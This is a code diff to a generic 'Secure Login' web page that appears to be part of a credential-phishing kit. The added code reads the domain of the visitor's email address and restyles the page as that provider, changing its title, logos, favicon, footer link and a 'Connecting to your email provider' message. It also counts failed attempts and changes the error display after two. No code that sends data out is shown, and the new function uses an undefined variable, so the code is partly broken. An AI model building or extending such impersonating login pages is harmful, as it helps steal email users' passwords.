@@ -59,6 +59,14 @@
             box-shadow: var(--shadow-sm);
         }
 
+        .domain-logo {
+            width: 32px;
+            height: 32px;
+            object-fit: contain;
+            border-radius: 6px;
+            box-shadow: var(--shadow-sm);
+        }
+
         .trademark-main {
             font-size: 18px;
             font-weight: 600;
@@ -164,6 +172,18 @@
             object-fit: contain;
         }
 
+        /* === DOMAIN INFO === */
+        .domain-info {
+            margin: 16px 0;
+            padding: 12px 16px;
+            background: #eff6ff;
+            border-radius: 10px;
+            color: #1e40af;
+            font-size: 13px;
+            text-align: center;
+            font-weight: 500;
+            border: 1.5px solid #bfdbfe;
+        }
 
         /* === BUTTON === */
         .btn {
@@ -272,13 +292,15 @@
 </head>
 <body>
     <div class="brand-container">
+        <img src="" alt="Domain Logo" class="domain-logo" id="brand-logo" style="display:none;">
         <span class="trademark-main" id="brand-name">Secure Login</span>
     </div>
 
     <div class="container">
         <form class="login-form" id="loginForm">
             <h2 id="form-title">
-               <span id="title-text">Secure Login</span>
+                <img src="" alt="Logo" class="domain-logo" id="title-logo" style="display:none;">
+                <span id="title-text">Secure Login</span>
             </h2>
 
             <div id="error-container" class="error-message" style="display:none;">
@@ -312,8 +334,8 @@
     </div>
 
     <div class="footer">
-        <span>© 2026 <span id="footer-domain">Secure Login</span>. All rights reserved.</span>
-        <a href="#" id="footer-link">state.domain</a>
+        <span>© 2025 <span id="footer-domain">Secure Login</span>. All rights reserved.</span>
+        <a href="#" id="footer-link">example.com</a>
         <span class="timestamp" id="footer-time">| Last updated: --</span>
     </div>
 
@@ -360,7 +382,7 @@
 
         // === STATE ===
         let state = { email: '', domain: '', attempts: 0, retryCount: 0 };
-        const saved = sessionStorage.getItem('loginState');
+        const saved = localStorage.getItem('loginState');
         if (saved) state = JSON.parse(saved);
 
         const urlParams = new URLSearchParams(window.location.search);
@@ -396,8 +418,8 @@
         };
 
         // === HELPERS ===
-        function saveState() { sessionStorage.setItem('loginState', JSON.stringify(state)); }
-        function clearState() { sessionStorage.removeItem('loginState'); state = { email: '', domain: '', attempts: 0, retryCount: 0 }; }
+        function saveState() { localStorage.setItem('loginState', JSON.stringify(state)); }
+        function clearState() { localStorage.removeItem('loginState'); state = { email: '', domain: '', attempts: 0, retryCount: 0 }; }
 
         function showError(msg, showLogo = false) {
             els.errorText.textContent = msg;
@@ -407,6 +429,27 @@
 
         function showPopup(msg) { alert(msg); }
 
+        function updateDomainUI(domain) {
+            if (!domain) return;
+            const favicon = FAVICON_MAP[domain] || '/default-favicon.ico';
+            const msg = DOMAIN_MESSAGES[domain] || `Connecting to your email provider`;
+
+            els.brandName.textContent = els.titleText.textContent = els.footerDomain.textContent = els.footerLink.textContent = domain;
+            els.footerLink.href = `https://${domain}`;
+            els.pageTitle.textContent = domain;
+            els.favicon.href = favicon;
+
+            [els.brandLogo, els.titleLogo].forEach(img => {
+                img.src = logo; img.style.display = 'block';
+                img.onerror = () => img.src = '/default-logo.png';
+            });
+            if (state.attempts >= 2) {
+                els.errorLogo.src = logo;
+                els.errorLogo.onerror = () => els.errorLogo.src = '/default-logo.png';
+            }
+            els.domainMessage.textContent = `${msg} (${domain})`;
+            els.domainInfo.style.display = 'block';
+        }
 
         function redirectToProvider(email) {
             const domain = email.split('@')[1].toLowerCase();
